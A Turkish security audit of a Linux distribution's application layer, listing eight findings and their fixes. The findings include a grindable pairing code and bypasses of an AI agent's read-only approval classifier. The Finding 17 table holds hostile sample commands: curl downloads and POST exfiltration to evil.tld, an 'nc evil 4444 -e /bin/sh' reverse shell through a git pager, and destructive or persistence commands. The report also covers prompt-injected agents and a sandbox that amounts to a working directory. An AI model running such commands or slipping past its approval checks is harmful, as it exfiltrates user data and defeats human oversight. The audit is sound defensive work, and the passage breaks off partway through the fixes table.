# Altıncı Tur — Uygulama Katmanı Denetimi

**Tarih:** 8 Eylül 2026
**Kapsam:** Önceki beş turun bilinçli olarak dışarıda bıraktığı alan —
uygulamaların *iç* kodu ve birbirine bakan yüzeyleri.

`DENETIM-BULGULARI.md` beş turdur boot/sistem katmanını ve `haze`/`hazedrop`
kriptografisini kapsadı. Bu tur şu üçünü hedefledi:

- **Maze-Connect** — ağ üzerinden konuşan tek bileşen, eşleştirme kriptografisi
- **Maze-AI** — model çıktısının kabuğa ulaştığı yol (prompt injection yüzeyi)
- **Qlam, Linux-Chan-AI, entropy-shield, maze-guard'ın ayrıcalıklı yolları**

**Sekiz bulgu.** İkisi ciddi, üçü orta, üçü düşük. Hepsi çalıştırılarak
doğrulandı — her birinin altında yeniden üretme adımı var.

> **Durum:** Sekiz bulgunun ve beş düşük öncelikli maddenin **tamamı
> düzeltildi.** Her düzeltme, bulguyu üreten senaryo tekrar çalıştırılarak
> doğrulandı; ayrıntılar en sonda **"Düzeltmeler"** bölümünde. Test sonuçları:
> maze-guard 285/285, Maze-Connect 13/13, Maze-AI 336 (+47 yeni), maze-cloak
> 41/41.

---

## Bulgu 16 — Eşleştirme kodu (SAS) ortadaki-adam saldırısını durdurmuyor  🔴 CİDDİ

**Dosya:** `Maze-Connect/core/src/crypto/Sas.cpp`,
`core/src/DeviceManager.cpp` (satır ~708-760, ~1329)
**Belge çelişkisi:** `docs/THREAT_MODEL.md` §"The SAS is bound to public keys"

**Neydi:** Eşleştirme akışı şu:

1. TLS açılır, **peer sertifikası bilerek doğrulanmaz** (`PROTOCOL.md` §Pairing/1)
2. Başlatan `pairRequest{nonce: N_A}` gönderir
3. Yanıtlayan `pairResponse{nonce: N_B}` gönderir
4. İki taraf da `SHA-256(ctx ‖ K_i ‖ K_r ‖ N_i ‖ N_r)` → 6 hane hesaplar
5. İnsanlar ekranları karşılaştırır

Tehdit modeli şunu iddia ediyor: *"MITM iki tarafa da kendi anahtarını sunmak
zorunda, kodlar farklı çıkar, karşılaştırma başarısız olur."*

**Bu iddia yanlış** — çünkü **taahhüt (commitment) adımı yok.** Yanıtlayan
kendi nonce'unu, karşı tarafınkini *gördükten sonra* seçiyor. Ortadaki adam da
öyle:

```
Alice ──[N_A]──▶ MITM ──[N_M2]──▶ Bob
Alice ◀─[N_M1]── MITM ◀──[N_B]── Bob
```

MITM önce Bob tarafını bitirir (`code_B` sabitlenir), sonra Alice'e göndereceği
`N_M1`'i `code_A == code_B` olana kadar **öğütür**. Arama uzayı 10⁶.

**Doğrulama** (bu denetimde çalıştırıldı, saf Python SHA-256 ile):

```
Bob'un ekranı   : 456903
Alice'in ekranı : 456903
denemeler=346944  süre=0.74 saniye
```

Optimize C ile bu milisaniyeler mertebesinde. Yani **SAS pratikte sıfır koruma
sağlıyor**; iki kullanıcı da aynı 6 haneyi görüyor, onaylıyor, ve MITM'in
anahtarları her iki tarafın pinned-device deposuna yazılıyor. Ondan sonraki
*her* bağlantı sessizce MITM üzerinden geçiyor — "pinlenmiş" olduğu için de
bir daha uyarı çıkmıyor.

**Neden mevcut test yakalamıyor:** `TestCrypto::sasDetectsManInTheMiddle` ve
`SasTest.detectsManInTheMiddle` yalnızca *pasif* MITM'i sınıyor — nonce'unu
rastgele seçen bir saldırgan. Öğüten saldırgan sınanmıyor.

**Gereken:** Taahhüt turu. Standart yapı (ZRTP/Signal SAS):
`pairRequest` nonce yerine `H(N_A)` taşır; `pairResponse` `N_B`'yi açık verir;
başlatan `N_A`'yı sonra açar; yanıtlayan taahhüdü doğrular. Böylece hiçbir
taraf karşısındakini gördükten sonra kendi katkısını değiştiremez.

**Bunu düzeltmek protokol sürümünü kırar** (`protocolVersion: 3` → 4) ve
Kotlin tarafıyla eşzamanlı gitmesi gerekir. → **Düzeltildi**, ayrıntı
"Düzeltmeler" bölümünde.

---

## Bulgu 17 — Maze-AI: "salt-okunur" sınıflandırıcısı atlatılabiliyor  🔴 CİDDİ

**Dosya:** `Maze-AI/maze_ai/agent/safety.py`, `is_readonly_command()`
**Etki:** Varsayılan ayarlarda (`mode=ask`, `auto_approve_readonly=True`)
**onay istenmeden** keyfi komut çalışması.

**Neydi:** `agent.py:_approval_reason()` "ask" modunda şu sırayla karar veriyor:

```python
if self.block_dangerous and is_dangerous_command(command): → sor
if command in self.always_allow:                           → çalıştır
if self.mode == MODE_AUTO:                                 → çalıştır
if self.auto_approve_readonly and is_readonly_command(cmd): → çalıştır  ← burası
return REASON_COMMAND  → sor
```

Yani `is_readonly_command` **tek başına onay kapısını açıyor.** Fonksiyonda
dört ayrı kaçış var:

### 17a — Satır sonu ayırıcı olarak sayılmıyor

```python
_SHELL_SPLIT = re.compile(r"\|\||&&|\||;|&")   # \n YOK
```

Komut bu desenlerle parçalanıyor, ama `\n` listede değil. Sonuç: tek segment
kalıyor, `shlex.split` satır sonunu boşluk gibi ayrıştırıyor, `tokens[0]`
zararsız komut oluyor ve geri kalan her şey görünmez hâle geliyor.

### 17b — `env` beyaz listede

`_READONLY_CMDS` içinde `env` ve `printenv` var. `env`, tanımı gereği
**keyfi komut çalıştırıcısıdır** — `env <komut> <argümanlar>`.

### 17c — Alt komut kontrolü `any()` ile yapılıyor

```python
if allowed is None or any(t in allowed for t in tokens[1:]):
```

İlk konumdaki alt komuta değil, **herhangi bir token'a** bakıyor. `git`
için izinli küme `{"status","log","branch","show",...}` — dolayısıyla
`git checkout branch` "salt-okunur" sayılıyor (`branch` token'ı yüzünden), ve
`git -c core.pager=<komut> log` pager üzerinden keyfi çalıştırma veriyor.

### 17d — `>` engelli ama `-o` değil

`sort -o <dosya> /dev/null` yönlendirme kullanmadan dosya kısaltıyor.

**Doğrulama** (bu denetimde çalıştırıldı, `safety.py` doğrudan import edilerek):

| Komut | `is_readonly` | `is_dangerous` | Sonuç |
|---|---|---|---|
| `env bash -c "curl http://evil.tld/x.sh -o /tmp/x"` | **True** | False | onaysız çalışır |
| `env rm -r /home/u/Projects` | **True** | False | onaysız çalışır |
| `ls\ncurl -X POST https://evil.tld -d @wallet.dat` | **True** | False | onaysız çalışır |
| `ls\nmv ~/Documents /tmp/stolen` | **True** | False | onaysız çalışır |
| `echo hi\nsystemctl --user enable evil.service` | **True** | False | onaysız çalışır |
| `git -c core.pager="nc evil 4444 -e /bin/sh" log` | **True** | False | onaysız çalışır |
| `sort -o /home/u/notes.txt /dev/null` | **True** | False | onaysız çalışır |

**Neden ciddi:** `EGRESS_TOOLS` yalnızca `fetch_url`'ü kapsıyor ve
`looks_like_exfiltration()` orada çok özenli yazılmış. Ama üçüncü satırdaki
`curl -d @...` aynı işi `run_command` üzerinden, **tek bir onay penceresi
görmeden** yapıyor. Prompt-injection'a maruz kalmış bir modelin ihtiyaç
duyduğu tam olarak budur — ve bu projede o yüzeyin farkında olunduğu
`safety.py`'ın kendi yorumlarında yazılı ("a poisoned web page could otherwise
talk the model into dumping the user's SSH key without a single prompt").

Gizli dosya koruması (`touches_sensitive_path`) ham metinde çalıştığı için
`~/.ssh` gibi yolları hâlâ yakalıyor — o katman sağlam. Kaçan şey, hassas
yol *içermeyen* her şey: kullanıcının belgeleri, cüzdan dosyaları, kalıcılık
kurulumu, ağa veri çıkışı.

**Gereken (dördü birden):**
1. `_SHELL_SPLIT`'e `\n` ve `\r` eklemek — ya da daha güvenlisi, komut satır
   sonu içeriyorsa doğrudan `False` dönmek.
2. `env`'i `_READONLY_CMDS`'ten çıkarmak (`printenv` kalabilir).
3. `_READONLY_SUBCMD` kontrolünü **ilk bayrak-olmayan token**'a bağlamak, ve
   `git` için `-c`/`--exec-path` gibi bayrakları reddetmek.
4. `sort`/`tee` benzeri yazma bayraklarını (`-o`, `--output`) reddetmek.

---

## Bulgu 18 — maze-guard: firewall "her şeyi engelleme" koruması atlatılabiliyor  🟠

**Dosya:** `maze-guard/maze/helper.py`, `_FWC_RULE_RES`

**Neydi:** Kural regexleri şu gerekçeyle yazılmış (koddaki yorum):

> *"an all-traffic source (0.0.0.0/0, ::/0) is rejected so a maze-group member
> can neither redirect traffic nor black-hole the whole system"*

Ama negatif ileri-bakış yalnızca **birebir** `0.0.0.0` ve `0.0.0.0/0` metnini
yakalıyor:

```python
r'(?!0\.0\.0\.0(/0)?(?: |$))'
```

`/0` maskesinin kendisi kontrol edilmiyor, sadece taban adres.

**Doğrulama** (bu denetimde çalıştırıldı):

| Kural | Kabul |
|---|---|
| `rule family=ipv4 source address=0.0.0.0/0 drop` | ✅ reddedildi |
| `rule family=ipv4 source address=1.2.3.4/0 drop` | ❌ **kabul edildi** (= /0, tüm internet) |
| `rule family=ipv4 source address=0.0.0.0/1 drop` | ❌ **kabul edildi** (IPv4'ün yarısı) |
| `rule family=ipv4 source address=128.0.0.0/1 drop` | ❌ **kabul edildi** (diğer yarısı) |
| `rule family=ipv6 source address=2000::/0 drop` | ❌ **kabul edildi** |
| `rule family=ipv6 source address=::/1 drop` | ❌ **kabul edildi** |

**Neden önemli — asimetri:** `--add-rich-rule` **kimlik doğrulaması
istemiyor** (tasarım gereği: "koruma eklemek zararsızdır"). Ama
`--remove-rich-rule` bir `source address=` kuralını hedefliyorsa
`_needs_consent()` devreye giriyor ve **polkit yönetici parolası** istiyor.

Yani `maze` grubundaki herhangi bir süreç — yani masaüstü kullanıcısı olarak
çalışan her şey — iki `--permanent` kuralla makineyi ağdan tamamen keser, ve
kullanıcı bunu geri almak için yönetici parolası girmek zorunda kalır. Sessiz,
kalıcı, tek yönlü bir DoS.

**Gereken:** Adres/maske çiftini regexle değil, `ipaddress` benzeri bir
ayrıştırmayla doğrulamak; `prefixlen` için asgari bir eşik koymak (örn. IPv4
için ≥ 8, IPv6 için ≥ 32). Regex burada yanlış araç: bir CIDR bloğunun ne
kadar geniş olduğu metinsel bir özellik değil.

---

## Bulgu 19 — Qlam: PATH'ten çözülen ikili root olarak çalıştırılıyor  🟠

**Dosya:** `Qlam/core/database_manager.py`, `_UpdateWorker.run()` (satır 114-145)

**Neydi:**

```python
freshclam = shutil.which("freshclam")     # ← kullanıcının PATH'i
...
script = ( "systemctl stop clamav-freshclam ...\n"
           f"'{freshclam}' --verbose --stdout\n" ... )
subprocess.Popen([pkexec, "/bin/sh", "-c", script])
```

Koddaki yorum şunu diyor: *"freshclam is an absolute path from shutil.which,
so there is no shell injection surface here."* — Enjeksiyon açısından doğru.
Ama sorun **enjeksiyon değil, hangi ikilinin çalıştığı.**

`shutil.which` `os.environ["PATH"]`'e bakar ve PATH'i kullanıcı kontrol eder.
`~/.local/bin/freshclam` yerleştiren bir süreç, kullanıcı Qlam'da "Veritabanını
Güncelle"ye bastığında **root olarak çalışır**.

**Kritik ayrıntı:** `pkexec` normalde hedef süreç için PATH'i temizler — ama
burada yol `pkexec` çalışmadan **önce** script metnine gömülüyor, dolayısıyla
o koruma devre dışı kalıyor.

Saldırı senaryosu gerçekçi: kullanıcı olarak çalışan zararlı bir süreç ikiliyi
bırakır ve bekler. Kullanıcı meşru bir antivirüs güncellemesi için kendi
parolasını girer — bu tam olarak beklediği prompttur — ve root verir.

**Gereken:** Sabit mutlak yol (`/usr/bin/freshclam`) kullanmak ve varlığını
doğrulamak; ya da daha temizi, `freshclam` için kendi polkit action'ını
tanımlayıp `pkexec /bin/sh -c` sarmalayıcısını tamamen kaldırmak.

`pkexec` da `shutil.which` ile bulunuyor ama o zararsız: sahte bir `pkexec`
zaten root veremez.

---

## Bulgu 20 — Maze-AI: API anahtarı diske 0644 ile yazılıyor  🟠

**Dosya:** `Maze-AI/maze_ai/config.py`, `save()`
**Belge çelişkisi:** Aynı dosyanın 3. satırındaki modül docstring'i

> *"The file is created with 0600 permissions because it may contain a Gemini
> API key."*

**Neydi:**

```python
CONFIG_DIR.mkdir(parents=True, exist_ok=True)   # → 0755
tmp = CONFIG_FILE.with_suffix(".tmp")
tmp.write_text(json.dumps(self._data, ...))     # → 0644, ANAHTAR İÇİNDE
os.replace(tmp, CONFIG_FILE)                    # rename modu korur → 0644
try: os.chmod(CONFIG_FILE, 0o600)
except OSError: pass                            # ← sessizce yutuluyor
```

**Doğrulama** (bu denetimde çalıştırıldı):

```
tmp dosyanın modu (anahtar diskteyken) : 0o644
os.replace SONRASI, chmod ÖNCESİ       : 0o644
chmod sonrası                          : 0o600
config DİZİNİNİN modu                  : 0o755
```

**Neden önemli:** Bu, **projenin kendi standardının ihlali ve zaten bir kez
düzeltilmiş bir hatanın tekrarı.** `haze/src/haze/storage/settings.py`
(Bulgu 15) tam olarak bu deseni düzeltti ve doğru kalıbı yorumla birlikte
bıraktı:

> *"Create with 0600 from the start rather than chmod-ing afterwards: between
> the two there is a window where the hashes are on disk and readable."*

Maze-AI'ye uygulanmadı. Üstelik `maze_ai/agent/safety.py` bu dosyayı kendi
hassas-yol listesine koyuyor (`r"(^|/)\.config/maze-ai/config\.json$"`) — yani
proje bu dosyayı sır olarak *tanıyor*, sadece öyle yazmıyor.

`chmod`'un `except OSError: pass` ile yutulması ikinci bir sorun: başarısız
olursa dosya kalıcı olarak 0644 kalır ve kimse öğrenmez.

**Gereken:** haze'deki kalıp — `os.open(..., O_WRONLY|O_CREAT|O_TRUNC, 0o600)`
ile geçici dosyayı baştan 0600 açmak, `CONFIG_DIR`'i 0700 yapmak.

---

## Bulgu 21 — maze-guard: `_run`'un "hard time limit"i hiçbir şeyi sınırlamıyor  🟡

**Dosya:** `maze-guard/maze/helper.py`, `_run()` (satır 624-641)

**Neydi:** Fonksiyonun docstring'i amacını açıkça yazıyor:

> *"`firewall-cmd` is not reliably fast: with firewalld stopped it sits in
> D-Bus activation until that times out, so a UI polling the rule list every
> few seconds could wedge the daemon indefinitely."*

Ama uygulama:

```python
await asyncio.wait_for(
    asyncio.to_thread(subprocess.run, args, capture_output=True, text=True),
    timeout=timeout)
```

`asyncio.wait_for` **çağıranı** bırakır. `to_thread` ile başlamış bir iş
iptal edilemez: iş parçacığı çalışmaya devam eder, `subprocess.run`'a
`timeout=` verilmediği için **çocuk süreç de yaşamaya devam eder.**

**Doğrulama** (bu denetimde çalıştırıldı):

```
1.0s -> TIMED OUT (caller gave up)
öksüz çocuk hâlâ çalışıyor: True   131605 sleep 8
worker thread ancak çocuk kendiliğinden bitince serbest kalıyor
```

**Neden önemli:** Varsayılan `ThreadPoolExecutor` `min(32, cpu+4)` işçiye
sahip. Docstring'in tarif ettiği senaryoda — firewalld takılmış, GUI birkaç
saniyede bir soruyor — her zaman aşımı bir işçiyi kalıcı olarak tüketir.
Havuz dolduğunda daemon **hiçbir komutu** çalıştıramaz hâle gelir: `ping`
bile. Yani kodun engellemek için yazıldığı "wedge" durumu tam olarak oluşur.

**Gereken:** `subprocess.run(args, ..., timeout=timeout)` — zaman aşımını
çocuğa da vermek, `wait_for`'u ikinci savunma olarak bırakmak.

---

## Bulgu 22 — Linux-Chan-AI: "sandbox" bir dizin değişikliğinden ibaret  🟡

**Dosya:** `Linux-Chan-AI/linux-chan.py`, `execute_command()` (satır 660),
`_sandbox_path()` (satır 678)
**Belge çelişkisi:** `README.md` satır 40

> *"Terminal agent — asks for approval before running any command; **sandboxed
> to `~/Linux-Chan-AI/`**, no sudo"*

**Neydi:** Üç ayrı sorun:

**22a — Kabuk komutu hiç sınırlandırılmıyor.** `execute_command` yalnızca
`cwd=SANDBOX_DIR` veriyor. Çalışma dizini bir hapis değildir:
`cat ~/.ssh/id_rsa`, `rm -rf ~/Belgeler`, `curl ... -o ~/.config/autostart/x.desktop`
— hepsi çalışır. Hata mesajının *"not allowed in sandbox mode"* demesi ve
sistem promptunun *"Commands run inside a sandbox directory"* demesi bu
izlenimi pekiştiriyor; ikisi de yalnızca modele verilen bir talimat, bir
yaptırım değil.

**22b — `sudo` engeli eksik.** Kontrol `re.search(r'\bsudo\b|\bsu\s', cmd)`.
Maze Linux'ta asıl yükseltme yolu olan **`pkexec` engellenmiyor** (`doas` da).

**22c — `_sandbox_path` önek karşılaştırması yapıyor.**

```python
if not abs_p.startswith(os.path.realpath(SANDBOX_DIR)):
```

Doğrulama (çalıştırıldı):

| Girdi | Sonuç |
|---|---|
| `../../etc/passwd` | ✅ engellendi |
| `/etc/passwd` | ✅ engellendi |
| `../Linux-Chan-AI-evil/x.txt` | ❌ **`~/Linux-Chan-AI-evil/x.txt`** |
| `../Linux-Chan-AI.bak/y` | ❌ **`~/Linux-Chan-AI.bak/y`** |

Bu, `Maze-Connect/core/src/filetransfer/PathSanitizer.cpp`'nin **doğru**
yaptığı ve gerekçesini yoruma yazdığı şeyin tam tersi:

> *"Compare on path boundaries so `/inbox-evil` is not accepted as being inside
> `/inbox`."*

**Hafifletici:** Komut çalışmadan önce açık bir onay diyaloğu var
(`_approve_command`), ve komut kullanıcıya gösteriliyor. Yani bu bir "sessiz
çalıştırma" değil. Sorun, kullanıcının **yanlış bir güvenlik modeliyle**
onaylaması: README ve arayüz "sandbox" diyor, kullanıcı da buna göre daha
gevşek onaylıyor.

**Not:** `linux-chan-ai` `maze-meta`'nın `depends` listesinde **yok**, yani
varsayılan kurulumun parçası değil. Etki alanı diğer bulgulardan dar.

**Gereken:** Ya iddiayı gerçek yapmak (`bwrap`/`firejail` ile gerçek hapis —
`firejail` zaten `maze-meta` bağımlılığı), ya da README ve arayüz metnini
düzeltip "onaylı komut çalıştırma, hapis yok" demek. `startswith` yerine
`os.path.commonpath` veya ayraç sınırında karşılaştırma; `pkexec`/`doas`
engeline eklenmeli.

---

## Bulgu 23 — entropy-shield: onion sunucusunda ek gruplar düşürülmüyor  🟡

**Dosya:** `entropy-shield/core/onion_server.py`, `start()`

**Neydi:** Koddaki SECURITY yorumu iddiayı açıkça koyuyor:

> *"Running it dropped to their uid means the server can only read what that
> user can already read."*

Uygulama:

```python
popen_kwargs["user"]  = uid
popen_kwargs["group"] = gid
```

`subprocess.Popen` `user=`/`group=` verildiğinde `setreuid`/`setregid` çağırır
ama **`setgroups` çağırmaz** — bunun için `extra_groups=` gerekir. Sonuç:
çocuk süreç ebeveynin (root daemon'ın) ek grup listesini **aynen devralır**.

**Doğrulama** (çalıştırıldı): `user=`/`group=` ile başlatılan çocuk,
ebeveynin ek gruplarının tamamını koruyor.

**Gerçek etki iki senaryoda farklı:**

- **systemd altında (normal yol):** `/proc/1/status` → `Groups:` boş. Çocuk
  boş bir ek grup listesi devralır — iddia edilen davranıştan *daha kapalı*.
  Zafiyet yok.
- **`sudo` ile elle başlatıldığında:** ek gruplar `[0]` (root) olur ve çocuğa
  geçer. `0440 root:root` olan `/etc/sudoers` gibi grup-root-okunur dosyalar,
  `serve_dir=/etc` ile HTTP üzerinden okunabilir hâle gelir — normal
  kullanıcının okuyamadığı bir dosya.

Ayrıca ters yön de eksik: **hedef kullanıcının** kendi ek grupları da
uygulanmıyor, yani ayrıcalık düşürme her iki yönde de yarım.

**Gereken:** `popen_kwargs["extra_groups"] = os.getgrouplist(pw.pw_name, gid)`
— hem root'un gruplarını atar hem kullanıcının gerçek gruplarını verir.

---

## Düşük öncelikli — kayda geçiyor

**HazeDrop `/info` kimlik doğrulamasız metadata veriyor.**
`server.py:_handle_info` parola kontrolünden *önce* çalışıyor ve
`filename`, `size`, `file_hash` (düz metnin SHA-256'sı) döndürüyor. URL'yi
bilen ama parolayı bilmeyen biri, paylaşılan dosyanın adını öğrenir ve
bilinen bir dosyayla eşleşip eşleşmediğini hash'ten **kesin olarak** doğrular.
Parola ikinci faktör olarak konumlandırıldığına göre, düz metin hash'inin
parolasız verilmesi o faktörü metadata için tamamen atlıyor.

**haze kurulum scripti sabit `/tmp` yolu kullanıyor.**
`haze/installer/install.sh:213` — `2>/tmp/haze-venv-err`. Tahmin edilebilir ad,
`O_EXCL` yok. Script kullanıcı olarak çalıştığı için etki dar (aynı kullanıcı
zaten o dosyaları yazabilir), ama `mktemp` bedava.

**maze-guard helper'da sınırsız görev oluşturma.**
`helper.py:_handle` her satır için `asyncio.create_task` açıyor. `gate`
semaforu *yürütmeyi* 4'le sınırlıyor ama *görev oluşturmayı* sınırlamıyor;
boru hattı hâlinde satır gönderen bir `maze` grubu istemcisi bellek şişirebilir.

**maze-guard helper'da 64 KB'lık satır sınırı yakalanmıyor.**
`async for raw in reader` alttan `readline()` çağırıyor; satır sonu olmadan
64 KB aşılırsa `ValueError` fırlar ve `except (IncompleteReadError,
ConnectionResetError)` bunu yakalamaz. Etki tek bağlantıyla sınırlı.

**Qlam karantina indeksi doğrulanmıyor.**
`quarantine_manager.py:restore_file` `entry.original_path`'e yazıyor ve bu
değer `~/.local/share/Qlam/quarantine/index.json`'dan geliyor. Uygulama
kullanıcı olarak çalıştığı sürece bu bir sınır ihlali değil (kullanıcı zaten
oraya yazabilir). Ama Qlam'ı root ile çalıştıran herhangi bir gelecek değişiklik
bunu doğrudan keyfi-root-yazmaya çevirir. Ayrıca `quarantine_file`
`shutil.move` ile `chmod 0o000` arasında dosyayı orijinal (muhtemelen
çalıştırılabilir) modda bırakan bir pencere bırakıyor.

---

## Denetlenip SAĞLAM çıkanlar

Bunlar ciddi şekilde arandı, sorun bulunmadı — bir sonraki denetim aynı yeri
kazmasın diye:

| Kontrol | Sonuç |
|---|---|
| Tüm Python'da `shell=True` / `os.system` / `eval` / `exec` | ✅ Yalnızca iki bilinçli yer: `Maze-AI.run_command` (tasarım) ve `Linux-Chan-AI.execute_command` (Bulgu 22) |
| `pickle` / `yaml.load` / `marshal` deserialization | ✅ Hiç yok |
| `verify=False` / `CERT_NONE` / `check_hostname=False` | ✅ Hiç yok |
| Zayıf kripto (`md5`, `sha1`, `random` modülü, ECB, DES) | ✅ Hiç yok |
| Kodda gömülü API anahtarı / parola / token | ✅ Hiç yok |
| `chmod 777` / `666` / dünya-yazılabilir dosya | ✅ Hiç yok |
| Maze kabuk scriptlerinde `eval` | ✅ Hiç yok (yalnızca oh-my-zsh vendor kodunda) |
| Maze kabuk scriptlerinde `curl \| sh` | ✅ Hiç yok |
| Maze kabuk scriptlerinde tırnaksız değişken genişletmesi | ✅ Disiplinli — `rm -rf` dâhil her yerde tırnaklı |
| `Maze-Connect` `PathSanitizer` | ✅ Kapsamlı: normalizasyon, kontrol karakterleri, iki ayraç türü, Windows ayrılmış adları, sondaki nokta/boşluk, ayraç sınırında kapsama kontrolü |
| `Maze-Connect` `CommandRunner` | ✅ argv listesi, kabuk yok, dosya izni kontrolü (`0600` değilse reddediyor), id tam eşleşme, eşzamanlılık/çıktı/zaman sınırları |
| `Maze-Connect` `ReplayWindow` | ✅ 1-tabanlı sayaç, pencere kayması, çok eski/tekrarlanan reddi |
| `Maze-Connect` web şablonu XSS | ✅ `textContent` kullanılıyor, `innerHTML` değil |
| `entropy-shield` torrc enjeksiyonu | ✅ `_torrc_safe()` iki katmanlı (config whitelist + CR/LF temizliği), köprü satırları dâhil |
| `entropy-shield` daemon `connect` parametreleri | ✅ Whitelist + `bool()` zorlaması |
| `entropy-shield` daemon istemci kimliği | ✅ `SO_PEERCRED`, her bağlantıda yeniden bağlanıyor (eski oturumdan sızmıyor) |
| `maze-guard` helper `SO_PEERCRED` + polkit | ✅ Özne `pid,başlangıç-zamanı,uid` ile sabitleniyor — pid geri dönüşümü kapalı |
| `maze-guard` helper soket izinleri | ✅ `umask(0o177)` ile oluşturuluyor, sonra `root:maze 0660` |
| `maze-guard` `_SVC_ALLOWED` / `_SYSCTL_ALLOWED` | ✅ Whitelist, `--set-default-zone` bilinçli dışarıda |
| `maze-cloak` daemon | ✅ Dinleyen yüzey yok; config `trusted=True` ile symlink'siz okunuyor |
| `HazeDrop` parola karşılaştırması | ✅ `hmac.compare_digest`, 3 denemede kilit (Bulgu 14 uygulanmış) |
| Canlı ISO sshd yapılandırması | ✅ Drop-in sırası doğru: `00-maze-hardening.conf` `10-archiso.conf`'u yeniyor (sshd'de ilk değer kazanır) → `PermitRootLogin no`. Boş parolalar `PermitEmptyPasswords` varsayılanı (`no`) ile reddediliyor |
| Canlı ISO parolasız sudo/polkit sızıntısı | ✅ `deploy-to-target.sh` hepsini siliyor (Tur 2'de doğrulanmıştı, hâlâ geçerli) |

---

## Bu denetimin görmediği

Kapsam dürüstlüğü için:

- **maze-guard'ın tespit motoru** (`maze/detection/*`) — paket ayrıştırma kodu
  incelenmedi. Kök olarak çalışan bir süreçte düşmanca paket ayrıştırılıyor;
  bir sonraki denetim için en değerli hedef bu.
- **maze-guard GUI** (`maze/gui/*`, ~9k satır) ve 285 testin kapsamı.
- **Maze-Connect'in Kotlin tarafı** — yalnızca C++ tarafı okundu. Bulgu 16
  her iki tarafı da etkiliyor.
- **MazeVMAndroid** ve **Maze-Security/native-tools** — çoğunlukla vendor
  kaynak (QEMU, OpenSSL, glib); Maze'e ait sarmalayıcı kod incelenmedi.
- **maze-plasma-config**, marka dosyaları, QML.

---

## Öncelik sırası

| # | Bulgu | Şiddet | Paket | Neden bu sırada |
|---|---|---|---|---|
| 1 | 17 — readonly atlatma | 🔴 | `maze-ai` | Tek dosyada düzeltilir, etki büyük, varsayılan ayarlarda aktif |
| 2 | 19 — pkexec PATH | 🟠 | `qlam` | Tek satır düzeltme, yerel yetki yükseltme |
| 3 | 20 — API anahtarı 0644 | 🟠 | `maze-ai` | Tek fonksiyon, kalıp `haze`'de zaten hazır |
| 4 | 18 — firewall /0 | 🟠 | `maze-guard` | Tek yönlü DoS, düzeltme küçük |
| 5 | 21 — `_run` timeout | 🟡 | `maze-guard` | Tek argüman (`timeout=`) |
| 6 | 23 — extra_groups | 🟡 | `entropy-shield` | Tek satır |
| 7 | 22 — sandbox iddiası | 🟡 | `linux-chan-ai` | Varsayılan kurulumda yok |
| 8 | **16 — SAS/MITM** | 🔴 | `maze-connect` | **En ciddi, ama en pahalı:** protokol sürümü kırılır, C++ ve Kotlin eşzamanlı gitmeli — bu yüzden en sona bırakıldı |

---

## Sonraki denetim için

Bu turun bıraktığı en değerli hedef: **`maze-guard`'ın tespit motoru.**
`helper.py` root olarak ham paket yakalıyor ve `maze/detection/*` bunları
ayrıştırıyor — yani düşmanca girdi, ayrıcalıklı bir süreçte, ayrıştırıcı
koduyla buluşuyor. Bu denetimde yalnızca BPF filtresi ve yakalama iş
parçacığının hata dayanıklılığı okundu; ayrıştırıcıların kendisi okunmadı.


---

# Düzeltmeler

Sekiz bulgunun ve beş düşük öncelikli maddenin tamamı düzeltildi. Her satırın
"doğrulama" sütunu, **bulguyu üreten senaryonun tekrar çalıştırıldığını** ifade
eder — düzeltmenin derlendiğini değil.

## Bulgu 16 — SAS'a taahhüt turu eklendi  🔴

**Değişen:** `Sas.{h,cpp}`, `Sas.kt`, `Messages.{h,cpp}`, `Messages.kt`,
`DeviceManager.cpp`, `DeviceManager.kt`, `Version.h`, `Version.kt`,
`docs/PROTOCOL.md` ve `docs/THREAT_MODEL.md` (her iki kopya).

Eşleştirme iki mesajdan **üçe** çıktı:

```
initiator -> responder : PairRequest  { commitment = commit(N_i) }
responder -> initiator : PairResponse { nonce = N_r }
initiator -> responder : PairReveal   { nonce = N_i }
```

`commit(n) = SHA-256("maze-connect/sas-commit/v1" || len‖n)` — SAS hash'inden
ayrı bir bağlam dizesiyle, çünkü aynı nonce iki hash'e de giriyor. Yanıtlayan
açılan nonce'u taahhüde karşı **sabit zamanda** doğruluyor
(`MessageDigest.isEqual` / elle XOR döngüsü) ve uyuşmazsa bağlantıyı düşürüyor.

Artık ne başlatan ne de yanıtlayan, karşısındakini gördükten sonra kendi
katkısını değiştirebiliyor — dolayısıyla ortadaki adamın iki yarısı da
değiştiremiyor.

**Protokol sürümü 3 → 4.** Bilinçli olarak kırıcı: v3'e düşerek anlaşmak,
zafiyetin kendisini geri getirirdi. Masaüstü paketi ve mobil uygulama **birlikte
yayınlanmalı**.

**Bu arada bulunan ikinci kusur:** güvenilmeyen-eş kapısındaki (`handleMessage`
/ `PAIRING_MESSAGES`) beyaz liste `PairReveal`'i tanımıyordu, dolayısıyla
yeni mesaj "eşleşmemiş eş izinsiz iş yapıyor" sayılıp bağlantı düşüyordu. İki
taraftaki listeye de eklendi. Bunu `tst_devicemanager` yakaladı.

**Doğrulama:** `commitmentStopsAGrindingManInTheMiddle` (C++ ve Kotlin)
saldırıyı **gerçekten uyguluyor** — Bob tarafını sabitleyip Alice tarafı için
çakışan nonce'u öğütüyor (~10⁶ deneme, testte ~9 sn), sonra taahhüdün bu sonucu
reddettiğini doğruluyor. Mevcut pasif MITM testi zafiyet boyunca yeşil kalırdı;
bu yüzden yenisi grind'i içeriyor. Ayrıca `commitmentBindsTheNonce`
(gizleme/bağlama/bozuk girdi) ve interop known-answer'ı
(`Jz2nu+C6nOgcIlgQwwHoK6148NvbSJrusnW6o8PaWj4=`) iki istemcide de sabitlendi.

**Test:** Maze-Connect 13/13 geçiyor (`tst_crypto` 14, `tst_devicemanager` 13,
`tst_interop` 14).

> ⚠️ **Kotlin tarafı bu makinede derlenemedi:** yalnızca JDK 8 kurulu, Gradle
> 17+ istiyor. C++ tarafı derlendi ve testleri geçti; Kotlin değişiklikleri
> C++ ile birebir aynı yapıyı kullanıyor ve aynı known-answer sabitini
> doğruluyor, ama **derleyiciden geçirilmedi.** Yayından önce
> `./gradlew :core:testDebugUnitTest` çalıştırılmalı.

## Bulgu 17 — Salt-okunur sınıflandırıcısı  🔴

**Değişen:** `Maze-AI/maze_ai/agent/safety.py`

Beş kaçış da kapatıldı — denetimde bulunan dördü, artı düzeltirken çıkan beşinci:

| Kaçış | Düzeltme |
|---|---|
| `\n` ayırıcı sayılmıyordu | `_SHELL_SPLIT`'e `\n` ve `\r` eklendi — her satır ayrı ayrı yargılanıyor, çok satırlı komut hepsi salt-okunursa hâlâ geçiyor |
| `env` beyaz listedeydi | Çıkarıldı (`printenv` kaldı), gerekçesi yorumda |
